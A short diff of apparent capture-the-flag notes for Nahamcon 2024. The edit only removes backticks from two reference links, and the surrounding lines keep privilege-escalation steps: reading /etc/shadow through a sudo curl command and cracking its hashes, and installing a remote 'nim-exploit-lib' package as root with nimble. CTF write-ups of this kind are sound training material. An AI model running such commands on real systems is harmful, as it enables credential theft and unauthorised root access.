@@ -36,7 +36,7 @@ This shows the user fry can execute a certain curl command as root without the n
 Using `sudo curl 127.0.0.1:8000/health-check file:///etc/shadow`.
 Then we can crack the hashes of the machine and pawn it.
 
-See `https://github.com/LazyTitan33/CTF-Writeups/blob/main/Nahamcon-2024/Misc/Curly_Fries.md`
+See https://github.com/LazyTitan33/CTF-Writeups/blob/main/Nahamcon-2024/Misc/Curly_Fries.md
 
 #### Nahamcon-2024/jack_be part 1
 
@@ -82,7 +82,7 @@ sudo -l
 sudo -u root /urs/bin/nimble install https://github.com/ThorD125/nim-exploit-lib
 ```
 
-See `https://game0v3r.vercel.app/blog/nahamconctf-miscellaneous`
+See https://game0v3r.vercel.app/blog/nahamconctf-miscellaneous
 
 ## extra s
 
